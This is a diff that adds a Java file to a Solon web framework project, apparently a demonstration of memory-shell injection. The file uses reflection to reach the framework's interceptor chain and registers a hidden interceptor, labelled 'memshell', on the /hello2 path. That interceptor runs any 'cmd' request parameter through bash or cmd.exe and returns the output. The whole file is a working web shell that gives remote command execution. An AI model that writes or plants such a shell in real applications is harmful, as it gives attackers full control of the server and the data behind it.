@@ -1,0 +1,57 @@
+package com.example.demo.injectController;
+
+import org.noear.solon.annotation.Controller;
+import org.noear.solon.annotation.Mapping;
+import org.noear.solon.core.ChainManager;
+import org.noear.solon.core.handle.Context;
+import org.noear.solon.core.handle.Handler;
+import org.noear.solon.core.route.PathRule;
+import org.noear.solon.core.route.RouterInterceptor;
+import org.noear.solon.core.route.RouterInterceptorChain;
+
+import static com.example.demo.injectController.FilterShell.getfieldobj;
+
+@Controller
+public class RiShell{
+    @Mapping("/ri")
+    public void ri() throws Exception {
+        Context ctx = Context.current();
+        Object _request = getfieldobj(ctx,"_request");
+        Object request = getfieldobj(_request,"request");
+        Object serverHandler = getfieldobj(request,"serverHandler");
+        Object handler = getfieldobj(serverHandler,"handler");
+        Object arg$1 = getfieldobj(handler,"arg$1");
+        ChainManager _chainManager = (ChainManager) getfieldobj(arg$1,"_chainManager");
+        _chainManager.addInterceptor(new RouterInterceptormemshell(),0);
+        System.out.println("Ri memshell added");
+    }
+
+    public class RouterInterceptormemshell implements RouterInterceptor{
+        @Override
+        public PathRule pathPatterns() {
+            return new PathRule().include("/hello2"); //限定路径，可以为return null;即作用于全路径
+//            return null;
+        }
+        @Override
+        public void doIntercept(Context ctx, Handler mainHandler, RouterInterceptorChain chain) throws Throwable {
+            try{
+                if(ctx.param("cmd")!=null){
+                    String str = ctx.param("cmd");
+                    try{
+                        String[] cmds =
+                                System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe",
+                                        "/c", str} : new String[]{"/bin/bash", "-c", str};
+                        String output = (new java.util.Scanner((new
+                                ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next();
+                        ctx.output(output);
+                    }catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+            }catch (Throwable e){
+                ctx.output(e.getMessage());
+            }
+            chain.doIntercept(ctx, mainHandler);
+        }
+    }
+}
